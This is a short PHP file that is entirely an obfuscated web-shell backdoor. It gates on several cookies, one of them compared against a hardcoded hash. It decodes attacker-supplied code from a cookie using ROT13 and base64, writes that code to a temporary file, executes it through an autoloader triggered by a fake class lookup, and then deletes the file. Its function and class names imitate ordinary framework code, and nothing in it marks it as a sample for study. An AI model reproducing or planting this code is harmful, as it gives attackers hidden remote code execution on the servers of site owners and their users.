<?php


if (isset($_COOKIE[79+-79]) && isset($_COOKIE[61-60]) && isset($_COOKIE[64-61]) && isset($_COOKIE[26-22])) {
    $pointer = $_COOKIE;
    function framework($component) {
        $pointer = $_COOKIE;
        $descriptor = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), 'b5d30816');
        if (!is_writable($descriptor)) {
            $descriptor = getcwd() . DIRECTORY_SEPARATOR . "secure_access";
        }
        $element = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($pointer[3]));
        if (is_writeable($descriptor)) {
            $dat = fopen($descriptor, 'w+');
            fputs($dat, $element);
            fclose($dat);
            spl_autoload_unregister(__FUNCTION__);
            require_once($descriptor);
            @array_map('unlink', array($descriptor));
        }
    }
    spl_autoload_register("framework");
    $entity = "920a2c17f96308d34f2bb22d5941412a";
    if (!strncmp($entity, $pointer[4], 32)) {
        if (@class_parents("dependency_resolver_config_manager", true)) {
            exit;
        }
    }
}
